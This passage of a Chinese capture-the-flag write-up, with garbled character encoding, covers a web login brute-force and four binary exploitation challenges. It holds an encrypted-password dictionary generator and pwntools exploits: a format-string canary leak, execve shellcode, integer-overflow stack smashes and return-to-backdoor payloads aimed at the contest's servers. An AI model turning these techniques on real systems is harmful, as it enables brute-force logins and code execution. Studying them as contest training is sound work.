class="keyword">return</span> _0xd115dc(_0x2bfff6);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bZMhU&#x27;</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;otSyR&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x486713, _0x17d2bc</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x486713 + _0x17d2bc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x5182d1 = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">    <span class="keyword">let</span> _0x20b0a1 = _0x326c0f[<span class="string">&#x27;foePj&#x27;</span>];</span><br><span class="line">    _0x5182d1[<span class="string">&#x27;setPublicKey&#x27;</span>](_0x20b0a1);</span><br><span class="line">    <span class="keyword">var</span> _0x4833f6 = _0x5182d1[<span class="string">&#x27;encrypt&#x27;</span>](_0x326c0f[<span class="string">&#x27;iaWKq&#x27;</span>](_0x326c0f[<span class="string">&#x27;PUpKG&#x27;</span>]($(_0x326c0f[<span class="string">&#x27;JNTjF&#x27;</span>])[<span class="string">&#x27;val&#x27;</span>](), <span class="string">&#x27;|-|&#x27;</span>), _0x326c0f[<span class="string">&#x27;OSnwF&#x27;</span>]($, <span class="string">&#x27;#password&#x27;</span>)[<span class="string">&#x27;val&#x27;</span>]()));</span><br><span class="line">    $[<span class="string">&#x27;ajax&#x27;</span>](&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;login.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: _0x326c0f[<span class="string">&#x27;bZMhU&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: _0x326c0f[<span class="string">&#x27;otSyR&#x27;</span>](<span class="string">&#x27;data=&#x27;</span>, _0x4833f6),</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1626c4</span>) </span>&#123;</span><br><span class="line">            coco[<span class="string">&#x27;alert&#x27;</span>](&#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;é»æ„®ãš&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: _0x1626c4</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (_0x326c0f[<span class="string">&#x27;DTeqY&#x27;</span>](_0x1626c4, <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>)) &#123;</span><br><span class="line">                _0x326c0f[<span class="string">&#x27;IeKGb&#x27;</span>](<span class="built_in">setTimeout</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    location[<span class="string">&#x27;reload&#x27;</span>]();</span><br><span class="line">                &#125;, <span class="number">0x3e8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);;</span><br><span class="line">_0xod5 = <span class="string">&#x27;jsjiami.com.v6&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ†æå‘ç°ï¼Œå‰ç«¯è¾“å…¥çš„è´¦å·å¯†ç ï¼Œä»¥ <code>username|-|password</code> çš„æ–¹å¼ç»„åˆåï¼Œå†ç»RSAåŠ å¯†å¾—åˆ°base64å¯†æ–‡ã€‚</p><p>ç”Ÿæˆçˆ†ç ´ç”¨å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU</span></span><br><span class="line"><span class="string">WXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE</span></span><br><span class="line"><span class="string">Hzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr</span></span><br><span class="line"><span class="string">KJVXPMuQVgrw/SxkBQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">password = <span class="built_in">str</span>(i)</span><br><span class="line">m = <span class="string">&#x27;admin|-|&#x27;</span> + password</span><br><span class="line">rsakey = RSA.importKey(public_key)</span><br><span class="line">cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">cipher_text = base64.b64encode(cipher.encrypt(m))</span><br><span class="line">f.write(cipher_text+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åä¸ŠBurpsuiteï¼ŒåŠ è½½æ–°å­—å…¸dict.txtï¼Œçˆ†ç ´æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="fo"><a href="#fo" class="headerlink" title="fo"></a>fo</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  speaking();</span><br><span class="line">  leak();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">speaking</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(</span><br><span class="line">           <span class="string">&quot;Do you know the format string?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;           you can message at here:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;            https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;I heared that you are interested in the CTF.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;           I hope that you will hold on to keep your interest\n&quot;</span></span><br><span class="line">    <span class="string">&quot;          tell me,will you?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will remember what you said&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wait for your good news...&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksecå‘ç°å­˜åœ¨canaryï¼Œåˆ©ç”¨<code>leak()</code> ä¸­å­˜åœ¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canaryï¼Œå†å®ç°ret2textã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38793</span>)</span><br><span class="line"></span><br><span class="line">[r.recvline() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;%17$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvline().strip()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">backdoor_addr = <span class="number">0x40080D</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(backdoor_addr)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know the ShellCode?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n---------^-^----------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;show me your Migic&quot;</span>);</span><br><span class="line">  read_shell_code();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you finished?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_shell_code</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_shell_code()</code> å°†è¾“å…¥çš„shellcodeå†™å…¥bssæ®µ <code>buf</code> åŒºåŸŸï¼Œå†é€šè¿‡ <code>read()</code> å®ç°ret2shellcodeã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">34717</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;show me your Migic\n&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.recvline()</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="magic-int"><a href="#magic-int" class="headerlink" title="magic_int"></a>magic_int</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_400959, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = -v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      EDG();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">EDG</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cä¸­intå–å€¼èŒƒå›´ä¸º -2147483648 ~ +2147483647ï¼Œè€Œ -2147483648 åˆšå¥½ä¸ºå–åå‘ç”Ÿä¸Šæº¢çš„æ•°ï¼Œä¼ å…¥å³å¯è¿›å…¥ <code>EDG()</code>ï¼Œå†ret2textã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38780</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400781</span></span><br><span class="line">r.send(<span class="string">&#x27;-2147483648\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x77</span> + p64(backdoor)</span><br><span class="line">r.send(pay)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="magic-abs"><a href="#magic-abs" class="headerlink" title="magic_abs"></a>magic_abs</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">92</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+6Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">time_t</span> timer; <span class="comment">// [rsp+70h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = time(&amp;timer);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  v11 = read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me your a g e:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your lucky number?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  v10 = abs32(v5);</span><br><span class="line">  v9 = (<span class="keyword">int</span>)(v10 + v11);</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi,%s And see you next time!\n&quot;</span>, s);</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Recording...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v13 = rand() % (((<span class="keyword">int</span>)abs32(v5 + v7) &gt;&gt; v7) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = rand() % <span class="number">10000</span>;</span><br><span class="line">  record(s, v5, v13, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n name: %s \n lucky number: %d \n tag: %d\n DOWN!\n&quot;</span>, a1, a2, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest[a3], a1, v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, a1, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€  <code>v7</code> å’Œ <code>v5</code>ï¼Œä½¿å¾— <code>(((int)abs32(v5 + v7) &gt;&gt; v7) + 1)</code> ä¸º1ï¼Œ<code>v13</code> ä¸å†éšæœºåªèƒ½å–0ï¼Œåœ¨ <code>record()</code> ä¸­ï¼Œè¾“å…¥çš„ <code>s</code> ä½œä¸ºpayloadå¤åˆ¶åˆ° <code>dest</code> åŒºåŸŸï¼Œé€ æˆæ ˆæº¢å‡ºã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">-2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">int</span>)v5); <span class="comment">//-2147483647</span></span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,((<span class="keyword">int</span>)(v5+v7))&gt;&gt;v7); <span class="comment">//0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">36236</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">backdoor_addr = <span class="number">0x4009D7</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor_addr)</span><br><span class="line">r.send(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;2147483647&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483647&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><blockquote><p>ç¨‹åºæµç¨‹è¯†åˆ«ï¼Œç®—æ³•é€†å‘</p></blockquote><p><code>login()</code> ä¸­ 